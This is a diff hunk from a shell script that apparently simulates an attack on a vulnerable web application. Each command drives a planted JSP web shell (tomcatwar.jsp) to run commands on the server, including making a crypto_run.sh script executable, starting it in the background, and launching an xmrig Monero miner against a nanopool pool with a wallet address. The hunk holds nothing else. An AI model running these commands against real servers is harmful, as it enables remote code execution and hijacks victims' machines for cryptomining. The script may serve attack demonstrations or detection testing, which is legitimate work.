@@ -409,7 +409,7 @@ curl --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode "cmd=wget
 curl --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode 'cmd=chmod u+x /crypto_run.sh' -s | grep -a -v request.getParameter | sort | uniq | sed '\~^//~d'
 
 simulate_command_fake 'curl -s --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode "cmd=setsid /xmrig-6.16.4/xmrig --donate-level 100 -o xmr-us-east1.nanopool.org:14433 -k -u 422skia35WvF9mVq9Z9oCMRtoEunYQ5kHPvRqpH1rGCv1BzD5dUY4cD8wiCMp4KQEYLAN1BuawbUEJE99SNrTv9N9gf2TWC --tls --coin monero --background"' 1 1 1
-curl --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode 'cmd=nohup /crypto_run.sh > output.log 2>&1 & disown ; ls' -s | grep -a -v request.getParameter | sort | uniq | sed '\~^//~d'
+screen -d -m bash -c "curl --output - $VULN_APP_ADD_2/tomcatwar.jsp?pwd=j --data-urlencode 'cmd=/crypto_run.sh' -s | grep -a -v request.getParameter | sort | uniq"
 simulate_command_fake 'curl -s --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode "cmd=ps -ef"' 1 1 1
 curl -s --output - "$VULN_APP_ADD_2/tomcatwar.jsp?pwd=j" --data-urlencode "cmd=ps -ef" | grep -a -v request.getParameter
 
